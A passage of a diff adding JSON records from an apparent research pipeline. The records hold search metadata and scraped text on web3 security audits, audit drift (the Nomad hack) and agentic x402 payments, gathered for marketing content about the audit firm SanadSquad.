+        "retrieved_at": "2026-10-24T00:21:22.064054Z",
+        "published_at": null,
+        "evidence_text": "[Skip to content](#start-of-content)   \n \n \n\n## Navigation Menu\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FdawidosX%2FANL-Protocol%2Fblob%2Fmain%2Fdocs%2FSECURITY-AUDITS.md)\n\nAppearance settings\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FdawidosX%2FANL-Protocol%2Fblob%2Fmain%2Fdocs%2FSECURITY-AUDITS.md)\n\n[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=dawidosX%2FANL-Protocol)\n\nAppearance settings\n\nYou signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert\n\n{{ message }}\n\n## Repository navigation\n\n \n\n## Expand file tree\n\n/\n\n# SECURITY-AUDITS.md\n\nCopy path\n\nMore file actions\n\nMore file actions\n\n## Latest commit\n\n## History\n\n[History](/dawidosX/ANL-Protocol/commits/main/docs/SECURITY-AUDITS.md)\n\nHistory\n\n220 lines (158 loc) \u00b7 33.6 KB\n\n/\n\n# SECURITY-AUDITS.md\n\nCopy path\n\n## File metadata and controls\n\n220 lines (158 loc) \u00b7 33.6 KB\n\n[Raw](https://github.com/dawidosX/ANL-Protocol/raw/refs/heads/main/docs/SECURITY-AUDITS.md)\n\nCopy raw file\n\nDownload raw file\n\nOutline\n\nEdit and raw actions\n\n# Security Audit History \u2014 ANL Staking Protocol\n\n**Status:** living document \u00b7 last updated **19 Jul 2026** **Scope:** the on-chain program `anl_staking` (Rust / Anchor), its math crate `anl-math`, the reference model in `core/`, CI, and the release/evidence tooling in `scripts/`. **Polish version:** [SECURITY-AUDITS.pl.md](/dawidosX/ANL-Protocol/blob/main/docs/SECURITY-AUDITS.pl.md)\n\n> This document supersedes the old, append-only `AUDIT-RESPONSE.md` notes. It presents the full audit trail chronologically: every round, every finding, its fix, and the evidence. The consolidated findings table is in [\u00a78](#8-consolidated-findings-table); open items are in [\u00a79](#9-open-items).\n\n---\n\n## 1. Methodology\n\nThe protocol undergoes iterative, AI-assisted security audits by independent reviewers (different models than the one implementing the code), each round working on a fresh snapshot of the repository. Each round produces a written report; the team responds with code fixes, records them here, and submits the updated snapshot for re-review. Supporting evidence lives in the repository itself: the CI pipeline (4 jobs: lint / test / release-guards / supply-chain), `scripts/audit-evidence.sh` (fmt, clippy `-D warnings`, all test suites, negative builds, cargo audit/deny), and `docs/TEST-LOG.txt`.\n\nSeverity conventions follow the reviewers' reports: **Critical** (funds at risk under realistic conditions), **High/H**, **Medium/M**, **Low/L**, and **process findings** (evidence/release pipeline rather than on-chain logic).\n\n---\n\n## 2. Round #1 \u2014 preliminary audit (GPT), 18 Jul 2026\n\nFirst external review of the complete Phase 1+2 implementation (all lifecycle instructions, three v",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-b2e105c75c274e95",
+        "kind": "web",
+        "url": "https://github.com/gmh5225/awesome-web3-security",
+        "title": "GitHub - gmh5225/awesome-web3-security: A curated list of Web3 Security materials and resources for Pentesters and Bug Hunters. \u00b7 GitHub",
+        "retrieved_at": "2026-10-24T00:21:22.064092Z",
+        "published_at": null,
+        "evidence_text": "## Navigation Menu\n\n## Latest commit\n\n## History\n\n## Folders and files\n\n| Name | | Name | Last commit message | Last commit date |\n| --- | --- | --- | --- | --- |\n| [.claude/skills](/gmh5225/awesome-web3-security/tree/main/.claude/skills \"This path skips through empty directories\") | | [.claude/skills](/gmh5225/awesome-web3-security/tree/main/.claude/skills \"This path skips through empty directories\") |  |  |\n| [LICENSE](/gmh5225/awesome-web3-security/blob/main/LICENSE \"LICENSE\") | | [LICENSE](/gmh5225/awesome-web3-security/blob/main/LICENSE \"LICENSE\") |  |  |\n| [README.md](/gmh5225/awesome-web3-security/blob/main/README.md \"README.md\") | | [README.md](/gmh5225/awesome-web3-security/blob/main/README.md \"README.md\") |  |  |\n| View all files | | |\n\n## Repository files navigation\n\n# `awesome-web3-security`[Awesome](https://awesome.re)\n\n`awesome-web3-security`\n![Awesome](https://camo.githubusercontent.com/9d49598b873146ec650fb3f275e8a532c765dabb1f61d5afa25be41e79891aa7/68747470733a2f2f617765736f6d652e72652f62616467652e737667)\n\n[![GitHub license](https://camo.githubusercontent.com/3674e1abccedd1a499a30620fef84e60949b0bf8543e88da1f7e48e66e9f35a9/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f676d68353232352f617765736f6d652d776562332d7365637572697479)](https://github.com/gmh5225/awesome-web3-security/blob/main/LICENSE)\n\n![GitHub license](https://camo.githubusercontent.com/3674e1abccedd1a499a30620fef84e60949b0bf8543e88da1f7e48e66e9f35a9/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f676d68353232352f617765736f6d652d776562332d7365637572697479)\n\nA curated list of Web3 Security materials and resources for Pentesters and Bug Hunters.\n\n`If you find that some links are not working, you can simply replace the username with gmh5225.\nOr you can send an issue for me.`\n\nShow respect to all the projects below, perfect works of art \ud83e\udee1\n\n## How to contribute?\n\n## Skills for AI Agents\n\nThis repository provides skills that can be used with AI agents and coding assistants such as [Cursor](https://www.cursor.com/), [OpenClaw](https://docs.openclaw.ai/), [Claude Code](https://docs.anthropic.com/en/docs/claude-code), [Codex CLI](https://github.com/openai/codex), and other compatible tools. Install skills to get specialized knowledge about Web3 security topics.\n\n**[View on learn-skills.dev](https://learn-skills.dev/skills/gmh5225/awesome-web3-security)**\n\n**Installation:**\n\n**Available Skills:**\n\n| Skill | Description |\n| --- | --- |\n| `mev-security` | MEV concepts, common attacks, and mitigations |\n| `awesome-web3-security-overview` | Understanding and contributing to this resource list |\n| `smart-contract-security` | EVM/Solidity smart contract security |\n| `solana-security` | Solana/Sealevel security research |\n| `web3-security-tooling` | Security tooling (analyzers, fuzzers, decompilers) |\n| `wallet-security` | Wallet security (MPC/TSS, key management, phishing) |\n\n`mev-security`\n`awesome-web3-security-overview`\n`sma",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-0825f45dffc44615",
+        "kind": "web",
+        "url": "https://github.com/solanabr/auditor-skill",
+        "title": "GitHub - solanabr/auditor-skill: Claude Code / agentic security skill for Solana programs and software. Full audit-firm lifecycle, executable PoC + fix-patch delivery, a Rust pre-scanner + cross-audit memory, 1,346 checks across 20 checklists, and 131 real-world attack vectors. \u00b7 GitHub",
+        "retrieved_at": "2026-10-24T00:21:22.064128Z",
+        "published_at": null,
+        "evidence_text": "[Skip to content](#start-of-content)   \n \n \n\n## Navigation Menu\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsolanabr%2Fauditor-skill)\n\nAppearance settings\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsolanabr%2Fauditor-skill)\n\n[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=solanabr%2Fauditor-skill)\n\nAppearance settings\n\nYou signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert\n\n{{ message }}\n\n## Repository navigation\n\n \n\n![solanabr](https://avatars.githubusercontent.com/u/231034025?s=60&v=4)\n\n**[auditor-skill](/solanabr/auditor-skill)**\n\nPublic\n\n* [Notifications](/login?return_to=%2Fsolanabr%2Fauditor-skill)You must be signed in to change notification settings\n* [Fork13\u00a0(13)](/login?return_to=%2Fsolanabr%2Fauditor-skill)\n* [Star59\u00a0(59)](/login?return_to=%2Fsolanabr%2Fauditor-skill)You must be signed in to star a repository\n\n## About\n\nClaude Code / agentic security skill for Solana programs and software. Full audit-firm lifecycle, executable PoC + fix-patch delivery, a Rust pre-scanner + cross-audit memory, 1,346 checks across 20 checklists, and 131 real-world attack vectors.\n\n[auditor-attest.vercel.app/](https://auditor-attest.vercel.app/)\n\n### Topics\n\n[anchor-lang](/topics/anchor-lang)[audit-skill](/topics/audit-skill)[claude-skills](/topics/claude-skills)[defi-security](/topics/defi-security)[pinnochio](/topics/pinnochio)[security-audit](/topics/security-audit)[solana-program](/topics/solana-program)[static-analysis](/topics/static-analysis)[vulnerability-scanner](/topics/vulnerability-scanner)[web3-audit-reports](/topics/web3-audit-reports)[web3-security](/topics/web3-security)\n\n### Resources\n\n[Readme](#readme-ov-file)\n\n[MIT license](#MIT-1-ov-file)\n\n### Contributing\n\n[Contributing](#contributing-ov-file)\n\n### Security policy\n\n[Security policy](#security-ov-file)\n\n[Activity](/solanabr/auditor-skill/activity)\n\n[Custom properties](/solanabr/auditor-skill/custom-properties)\n\n### Stars\n\n**59** stars\n\n### Watchers\n\n**0** watching\n\n### Forks\n\n[**13** forks](/solanabr/auditor-skill/forks)\n\n[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fsolanabr%2Fauditor-skill&report=solanabr+%28user%29)\n\n[Branches](/solanabr/auditor-skill/branches)[Tags](/solanabr/auditor-skill/tags)\n\nOpen more actions menu\n\n## Latest commit\n\n## History\n\n[49 Commits](/solanabr/auditor-skill/commits/main/)\n\n49 Commits\n\n## Folders and files\n\n| Name | Name | Last commit message | Last commit date |\n| --- | --- | --- | --- |\n| [.claude-plugin](/solanabr/auditor-skill/tree/main/.claude-plugin \".claude-plugin\") | [.claude-plugin](/solanabr/auditor-skill/tree/main/.claude-plugin \".claude-plugin\") |  |  |\n| [.github](/solanabr/auditor-skill/tree/main/.github \".github",
+        "status": "ok"
+      }
+    ],
+    "action": "web_search",
+    "query": "web3 security audits deployed-code drift",
+    "query_attempts": [
+      {
+        "query": "web3 security audits deployed-code drift",
+        "service_line": "web3-security",
+        "backend": "tavily",
+        "result_count": 5
+      }
+    ],
+    "url_events": [
+      {
+        "url": "https://www.zellic.io/blog/audit-drift",
+        "final_url": "https://www.zellic.io/blog/audit-drift",
+        "service_line": "web3-security",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://github.com/topics/smart-contract-security?o=desc&s=forks",
+        "final_url": "https://github.com/topics/smart-contract-security?o=desc&s=forks",
+        "service_line": "web3-security",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://github.com/dawidosX/ANL-Protocol/blob/main/docs/SECURITY-AUDITS.md",
+        "final_url": "https://github.com/dawidosX/ANL-Protocol/blob/main/docs/SECURITY-AUDITS.md",
+        "service_line": "web3-security",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://github.com/gmh5225/awesome-web3-security",
+        "final_url": "https://github.com/gmh5225/awesome-web3-security",
+        "service_line": "web3-security",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://github.com/solanabr/auditor-skill",
+        "final_url": "https://github.com/solanabr/auditor-skill",
+        "service_line": "web3-security",
+        "reason": "fetched"
+      }
+    ],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_3/research/1/1",
+    "slot_id": "marketing_3",
+    "attempt": 1,
+    "pack": {
+      "slot_id": "marketing_3",
+      "topic_id": "ANGLE-web3-security",
+      "topic_name": "web3-security",
+      "sources": [
+        {
+          "source_id": "WEB-d41df0417a0182fc",
+          "kind": "web",
+          "url": "https://www.zellic.io/blog/audit-drift",
+          "title": "You Could Have Found the Nomad Hack | Zellic \u2014 Research",
+          "retrieved_at": "2026-10-24T00:21:22.063891Z",
+          "published_at": null,
+          "evidence_text": "![](/blog/img/zellic-symbol-type-logo.svg)\n\n# You Could Have Found the Nomad Hack\n\n![Article heading](/blog/img/article_heading.svg)\n\nIn August 2022, the Nomad token bridge was\n[exploited\u2197](https://rekt.news/nomad-rekt/) for $190M. What\u2019s interesting\nis that anyone could have pinpointed the vulnerable code relatively\neasily. That\u2019s because the vulnerable code was unaudited.\n\nWe\u2019ve built a tool, called the [Audit Coverage\nTracker\u2197](https://app.zellic.io/), which tracks what code is audited and\nunaudited for the biggest DeFi protocols. In this blog post, we\u2019ll\nexplore how the Nomad bridge bug could have been spotted months ahead of\ntime.\n\n## Introduction[\u200b](/blog/audit-drift#introduction \"Direct link to Introduction\")\n\nOf the top 20 hacks currently on the [Rekt\nLeaderboard\u2197](https://rekt.news/leaderboard), 15 out of 20 were unaudited\n(including Nomad). While audits are not a perfect or complete solution\nto smart contract security, they are nonetheless a valuable line of\ndefense. Unaudited code is much more likely than audited code to contain\nbugs or security vulnerabilities. That\u2019s because in an audit, the scoped\ncode is reviewed by a team of security professionals who are experts at\nfinding bugs. And when hunting for bugs, attackers like to start by\nlooking in places that no one else has\u2013i.e., unaudited code.\n\nIn the case of Nomad, the bridge was [audited by\nQuantstamp\u2197](https://certificate.quantstamp.com/full/nomad) in June 2022.\nAccording to Quantstamp, the buggy code responsible for the hack was\nintroduced [after the audit had\nbegun\u2197](https://twitter.com/Quantstamp/status/1554348545812996096). In\nother words, the smart contract code that was ultimately deployed\n**differed from the audited code**! And it was in this later-introduced\ncode that a fatal bug was present.\n\nThis issue, or *audit drift*, is a well-known problem throughout the\nWeb3 security industry. However, to the best of our knowledge, no one is\ntracking the on-chain audit drift of popular DeFi and Web3 protocols!\nThere are billions of dollars locked in potentially unaudited code. This\nposes a serious, ongoing security risk to the community.\n\nTo solve this problem, we\u2019ve developed an [Audit Coverage\nTracker\u2197](https://app.zellic.io/), which we\u2019ve made publicly available\nfor the community to use. We\u2019ve also analyzed several popular, large\nDeFi applications for audit drift and added them to the tracker. We\ninvite the community to explore the results and share feedback.\n\n![](https://blog-cdn.zellic.io/blog/assets/images/63741920c01b13dc7eae10e6_upload_0d7540c1e1984c444f6a45954c586ab2[1]-276d72e1c8dabfa73ffa6100c680cdc9.png)\n\n![](https://blog-cdn.zellic.io/blog/assets/images/63741920c01b13dc7eae10e6_upload_0d7540c1e1984c444f6a45954c586ab2[1]-276d72e1c8dabfa73ffa6100c680cdc9.png)\n\nOn the tracker, you may also [suggest additional\nprojects\u2197](https://app.zellic.io/new) for tracking. For now, this feature\nis in beta, and submissions are manually reviewed for accuracy.\nDepending on community in",
+          "status": "ok"
+        },
+        {
+          "source_id": "STAT-01",
+          "kind": "stat",
+          "url": null,
+          "title": "SanadSquad",
+          "retrieved_at": "2026-10-24T00:21:23.566445Z",
+          "published_at": null,
+          "evidence_text": "SanadSquad provides smart contract audits across EVM and Solana/SVM.",
+          "status": "ok"
+        },
+        {
+          "source_id": "STAT-05",
+          "kind": "stat",
+          "url": null,
+          "title": "SanadSquad",
+          "retrieved_at": "2026-10-24T00:21:23.566460Z",
+          "published_at": null,
+          "evidence_text": "Teams can request a review.",
+          "status": "ok"
+        }
+      ],
+      "kb_allowed": false
+    },
+    "evidence": [
+      {
+        "source_id": "WEB-d41df0417a0182fc",
+        "kind": "web",
+        "url": "https://www.zellic.io/blog/audit-drift",
+        "title": "You Could Have Found the Nomad Hack | Zellic \u2014 Research",
+        "retrieved_at": "2026-10-24T00:21:22.063891Z",
+        "published_at": null,
+        "evidence_text": "![](/blog/img/zellic-symbol-type-logo.svg)\n\n# You Could Have Found the Nomad Hack\n\n![Article heading](/blog/img/article_heading.svg)\n\nIn August 2022, the Nomad token bridge was\n[exploited\u2197](https://rekt.news/nomad-rekt/) for $190M. What\u2019s interesting\nis that anyone could have pinpointed the vulnerable code relatively\neasily. That\u2019s because the vulnerable code was unaudited.\n\nWe\u2019ve built a tool, called the [Audit Coverage\nTracker\u2197](https://app.zellic.io/), which tracks what code is audited and\nunaudited for the biggest DeFi protocols. In this blog post, we\u2019ll\nexplore how the Nomad bridge bug could have been spotted months ahead of\ntime.\n\n## Introduction[\u200b](/blog/audit-drift#introduction \"Direct link to Introduction\")\n\nOf the top 20 hacks currently on the [Rekt\nLeaderboard\u2197](https://rekt.news/leaderboard), 15 out of 20 were unaudited\n(including Nomad). While audits are not a perfect or complete solution\nto smart contract security, they are nonetheless a valuable line of\ndefense. Unaudited code is much more likely than audited code to contain\nbugs or security vulnerabilities. That\u2019s because in an audit, the scoped\ncode is reviewed by a team of security professionals who are experts at\nfinding bugs. And when hunting for bugs, attackers like to start by\nlooking in places that no one else has\u2013i.e., unaudited code.\n\nIn the case of Nomad, the bridge was [audited by\nQuantstamp\u2197](https://certificate.quantstamp.com/full/nomad) in June 2022.\nAccording to Quantstamp, the buggy code responsible for the hack was\nintroduced [after the audit had\nbegun\u2197](https://twitter.com/Quantstamp/status/1554348545812996096). In\nother words, the smart contract code that was ultimately deployed\n**differed from the audited code**! And it was in this later-introduced\ncode that a fatal bug was present.\n\nThis issue, or *audit drift*, is a well-known problem throughout the\nWeb3 security industry. However, to the best of our knowledge, no one is\ntracking the on-chain audit drift of popular DeFi and Web3 protocols!\nThere are billions of dollars locked in potentially unaudited code. This\nposes a serious, ongoing security risk to the community.\n\nTo solve this problem, we\u2019ve developed an [Audit Coverage\nTracker\u2197](https://app.zellic.io/), which we\u2019ve made publicly available\nfor the community to use. We\u2019ve also analyzed several popular, large\nDeFi applications for audit drift and added them to the tracker. We\ninvite the community to explore the results and share feedback.\n\n![](https://blog-cdn.zellic.io/blog/assets/images/63741920c01b13dc7eae10e6_upload_0d7540c1e1984c444f6a45954c586ab2[1]-276d72e1c8dabfa73ffa6100c680cdc9.png)\n\n![](https://blog-cdn.zellic.io/blog/assets/images/63741920c01b13dc7eae10e6_upload_0d7540c1e1984c444f6a45954c586ab2[1]-276d72e1c8dabfa73ffa6100c680cdc9.png)\n\nOn the tracker, you may also [suggest additional\nprojects\u2197](https://app.zellic.io/new) for tracking. For now, this feature\nis in beta, and submissions are manually reviewed for accuracy.\nDepending on community in",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-01",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-24T00:21:23.566445Z",
+        "published_at": null,
+        "evidence_text": "SanadSquad provides smart contract audits across EVM and Solana/SVM.",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-05",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-24T00:21:23.566460Z",
+        "published_at": null,
+        "evidence_text": "Teams can request a review.",
+        "status": "ok"
+      }
+    ],
+    "action": "resolved",
+    "query": "",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_1/research_search/1/1",
+    "slot_id": "marketing_1",
+    "attempt": 1,
+    "pack": null,
+    "evidence": [
+      {
+        "source_id": "WEB-6336a84ca33f90b3",
+        "kind": "web",
+        "url": "https://www.visa.com/vcom-assets/content/dam/visa/reimagine-visa/thought-leadership/documents/agentic-payments-report.pdf",
+        "title": "Visa: Agentic Payments from the Ground Up",
+        "retrieved_at": "2026-10-24T00:21:24.315883Z",
+        "published_at": null,
+        "evidence_text": "July 2026 TRANSACTION SHAPE & NEW ARCHITECTURE REQUIREMENTS JULY 2026 JULY 2026 1.1 Defining Agentic Commerce Agentic commerce is a new economic surface where software autonomously discovers, evaluates, and executes transactions \u0013 continuously, programmatically, and across a far wider range of commerce than traditional payment infrastructure was designed to handle. The degree of autonomy varies. Some workflows keep a human in the loop to review or approve purchases, while others run fully autonomously once configured. Agents can buy SaaS licenses, book travel, automate accounts payable, reorder physical inventory, and commission creative work, often without human intervention at the moment of purchase. Within that broader landscape, a new sub-category of machine-native, sub-dollar transactions is also emerging: an AI agent calls an API, receives an HTTP 402 response (\u001cPayment Required\u001d), evaluates the price, pays, and consumes the resource. That cycle takes milliseconds and requires no checkout page, saved card, or browsing session \u0013 only a wallet or card, a budget, and an objective. For payment providers, the full spectrum of agentic commerce creates new transaction surfaces with different economics, risk controls, and infrastructure requirements from traditional e-commerce.\nAI crosses the line from chatbot to agent when it begins to reason through multi-step tasks, call external tools, evaluate results, and iterate on its approach autonomously. Agents built on frontier models like Claude, GPT, and Gemini are now deployed in production across every business vertical. Over the past year, these agents have become very capable at writing code and conducting research, but they are inherently limited by access.\nGiving agents the ability to pay removes that constraint: An IT agent purchases fifty additional seats on a SaaS platform after headcount changes.\nAn administrative agent reorders printer toner and breakroom supplies when inventory runs low.\nA research agent queries five financial data providers a few cents each for the same company\u2019s filings, then picks the most complete dataset.\nA marketing agent pays ten image-generation providers 5 cents each to render the same product shot, then selects the best output.\nAgentic payments span two distinct transaction categories. The first is macro, where an agent executes high-value, consumer-like purchases on behalf of a human (e.g., booking travel, managing subscriptions, ordering supplies). These transactions resemble traditional e-commerce, with the agent acting as a proxy for human intent. The second category is micro, characterized by high-frequency, low-value purchases (i.e., API calls, data queries, compute access, tool usage) initiated by the agent. Both categories are real and growing, but micro-transactions are the area where new payment architecture is most needed, and where new protocols are emerging to fill the gap.\nTwo open-source payment protocols have gone live in the past twelve months to",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-ada97018f1630869",
+        "kind": "web",
+        "url": "https://github.com/Neji402/awesome-x402-engedi",
+        "title": "GitHub - Neji402/awesome-x402-engedi: \ud83d\ude80 Curated list of x402 resources: HTTP 402 Payment Required protocol for blockchain payments, crypto micropayments, AI agents, API monetization. Includes SDKs (TypeScript, Python, Rust), examples, facilitators (Coinbase, Cloudflare), MCP integration, tutorials. Accept USDC payments with one line of code. Perfect for AI agent economy. \u00b7 GitHub",
+        "retrieved_at": "2026-10-24T00:21:24.315932Z",
+        "published_at": null,
+        "evidence_text": "[Skip to content](#start-of-content)   \n \n \n\n## Navigation Menu\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNeji402%2Fawesome-x402-engedi)\n\nAppearance settings\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNeji402%2Fawesome-x402-engedi)\n\n[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Neji402%2Fawesome-x402-engedi)\n\nAppearance settings\n\nYou signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert\n\n{{ message }}\n\n## Repository navigation\n\n \n\n![Neji402](https://avatars.githubusercontent.com/u/296043887?s=60&v=4)\nPublic\n\nforked from [xpaysh/awesome-x402](/xpaysh/awesome-x402)\n\n* [Notifications](/login?return_to=%2FNeji402%2Fawesome-x402-engedi)You must be signed in to change notification settings\n* [Fork0\u00a0(0)](/login?return_to=%2FNeji402%2Fawesome-x402-engedi)\n* [Star0\u00a0(0)](/login?return_to=%2FNeji402%2Fawesome-x402-engedi)You must be signed in to star a repository\n\n## About\n\n\ud83d\ude80 Curated list of x402 resources: HTTP 402 Payment Required protocol for blockchain payments, crypto micropayments, AI agents, API monetization. Includes SDKs (TypeScript, Python, Rust), examples, facilitators (Coinbase, Cloudflare), MCP integration, tutorials. Accept USDC payments with one line of code. Perfect for AI agent economy.\n\n### Resources\n\n### Code of conduct\n\n[Code of conduct](/Neji402/awesome-x402-engedi#coc-ov-file)\n\n### Contributing\n\n### Stars\n\n**0** stars\n\n### Watchers\n\n**0** watching\n\n### Forks\n\n[**0** forks](/Neji402/awesome-x402-engedi/forks)\n\n[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FNeji402%2Fawesome-x402-engedi&report=Neji402+%28user%29)\n\n[Branches](/Neji402/awesome-x402-engedi/branches)[Tags](/Neji402/awesome-x402-engedi/tags)\n\nOpen more actions menu\n\n## Latest commit\n\n## History\n\n[783 Commits](/Neji402/awesome-x402-engedi/commits/main/)\n\n783 Commits\n\n## Folders and files\n\n| Name | Name | Last commit message | Last commit date |\n| --- | --- | --- | --- |\n| [.github/workflows](/Neji402/awesome-x402-engedi/tree/main/.github/workflows \"This path skips through empty directories\") | [.github/workflows](/Neji402/awesome-x402-engedi/tree/main/.github/workflows \"This path skips through empty directories\") |  |  |\n|  | [docs](/Neji402/awesome-x402-engedi/tree/main/docs \"docs\") |  |  |\n|  | [.gitignore](/Neji402/awesome-x402-engedi/blob/main/.gitignore \".gitignore\") |  |  |\n|  | [CODE\\_OF\\_CONDUCT.md](/Neji402/awesome-x402-engedi/blob/main/CODE_OF_CONDUCT.md \"CODE_OF_CONDUCT.md\") |  |  |\n|  | [CONTRIBUTING.md](/Neji402/awesome-x402-engedi/blob/main/CONTRIBUTING.md \"CONTRIBUTING.md\") |  |  |\n|  | [LICENSE](/Neji402/awesome-x402-engedi/blob/main/LICENSE \"LICENSE\") |  |  |\n| [README.md](/Neji402/awesome-x402-engedi/blob/main/README.md \"README.md",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-d2fb184d3b544a63",
+        "kind": "web",
+        "url": "https://github.com/RipperMercs/awesome-x402-xpaysh",
+        "title": "GitHub - RipperMercs/awesome-x402-xpaysh: \ud83d\ude80 Curated list of x402 resources: HTTP 402 Payment Required protocol for blockchain payments, crypto micropayments, AI agents, API monetization. Includes SDKs (TypeScript, Python, Rust), examples, facilitators (Coinbase, Cloudflare), MCP integration, tutorials. Accept USDC payments with one line of code. Perfect for AI agent economy. \u00b7 GitHub",
+        "retrieved_at": "2026-10-24T00:21:24.315961Z",
+        "published_at": null,
+        "evidence_text": "[Skip to content](#start-of-content)   \n \n \n\n## Navigation Menu\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRipperMercs%2Fawesome-x402-xpaysh)\n\nAppearance settings\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRipperMercs%2Fawesome-x402-xpaysh)\n\n[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=RipperMercs%2Fawesome-x402-xpaysh)\n\nAppearance settings\n\nYou signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert\n\n{{ message }}\n\n## Repository navigation\n\n \n\n![RipperMercs](https://avatars.githubusercontent.com/u/268111110?s=60&v=4)\nPublic\n\nforked from [xpaysh/awesome-x402](/xpaysh/awesome-x402)\n\n* [Notifications](/login?return_to=%2FRipperMercs%2Fawesome-x402-xpaysh)You must be signed in to change notification settings\n* [Fork0\u00a0(0)](/login?return_to=%2FRipperMercs%2Fawesome-x402-xpaysh)\n* [Star0\u00a0(0)](/login?return_to=%2FRipperMercs%2Fawesome-x402-xpaysh)You must be signed in to star a repository\n\n## About\n\n\ud83d\ude80 Curated list of x402 resources: HTTP 402 Payment Required protocol for blockchain payments, crypto micropayments, AI agents, API monetization. Includes SDKs (TypeScript, Python, Rust), examples, facilitators (Coinbase, Cloudflare), MCP integration, tutorials. Accept USDC payments with one line of code. Perfect for AI agent economy.\n\n### Resources\n\n[License](#License-1-ov-file)\n\n### Code of conduct\n\n[Code of conduct](/RipperMercs/awesome-x402-xpaysh#coc-ov-file)\n\n### Contributing\n\n[Contributing](#contributing-ov-file)\n\n[Activity](/RipperMercs/awesome-x402-xpaysh/activity)\n\n### Stars\n\n**0** stars\n\n### Watchers\n\n**0** watching\n\n### Forks\n\n[**0** forks](/RipperMercs/awesome-x402-xpaysh/forks)\n\n[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FRipperMercs%2Fawesome-x402-xpaysh&report=RipperMercs+%28user%29)\n\n[Branches](/RipperMercs/awesome-x402-xpaysh/branches)[Tags](/RipperMercs/awesome-x402-xpaysh/tags)\n\nOpen more actions menu\n\n## Latest commit\n\n## History\n\n[348 Commits](/RipperMercs/awesome-x402-xpaysh/commits/main/)\n\n348 Commits\n\n## Folders and files\n\n| Name | Name | Last commit message | Last commit date |\n| --- | --- | --- | --- |\n| [.github/workflows](/RipperMercs/awesome-x402-xpaysh/tree/main/.github/workflows \"This path skips through empty directories\") | [.github/workflows](/RipperMercs/awesome-x402-xpaysh/tree/main/.github/workflows \"This path skips through empty directories\") |  |  |\n| [docs](/RipperMercs/awesome-x402-xpaysh/tree/main/docs \"docs\") | [docs](/RipperMercs/awesome-x402-xpaysh/tree/main/docs \"docs\") |  |  |\n| [.gitignore](/RipperMercs/awesome-x402-xpaysh/blob/main/.gitignore \".gitignore\") | [.gitignore](/RipperMercs/awesome-x402-xpaysh/blob/main/.gitignore \".gitignore\") |  |  |\n| [CODE\\_OF\\_CONDUCT.md](/RipperMerc",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-2869b4da65b9ba10",
+        "kind": "web",
+        "url": "https://docs.dune.com/data-catalog/curated/payments/agentic-payments",
+        "title": "Agentic Payments - Dune Docs",
+        "retrieved_at": "2026-10-24T00:21:24.315985Z",
+        "published_at": null,
+        "evidence_text": "> ## Documentation Index\n>\n> Fetch the complete documentation index at:</llms.txt>\n>\n> Use this file to discover all available pages before exploring further.\n\n[Dune Docs home page![light logo](https://mintcdn.com/dune/zh-3B8LgVmyrKOaG/logo/dune-logo-light.svg?fit=max&auto=format&n=zh-3B8LgVmyrKOaG&q=85&s=6fec71d5070d0923eb2924321131b1c2)![dark logo](https://mintcdn.com/dune/zh-3B8LgVmyrKOaG/logo/dune-logo-dark.svg?fit=max&auto=format&n=zh-3B8LgVmyrKOaG&q=85&s=2501750983cc95aa72d40acc6f005bd9)](https://docs.dune.com/)\n\n[Docs](/)[Data Catalog](/data-catalog/overview)[API Reference](/api-reference/overview/introduction)[SQL Query Engine](/query-engine/overview)[Resources](/resources/credits-billing/overview)\n\nPayments\n\n# Agentic Payments\n\nMachine-to-machine onchain payment activity across open HTTP 402 payment standards \u2014 x402 and MPP (onchain Tempo rails only).\n\nThe `payments.agentic_payments` table captures machine-to-machine onchain payment activity settled through open payment standards built on HTTP 402. The dataset covers two protocols:\n\n* **x402** \u2014 an onchain-native payment standard. Payment 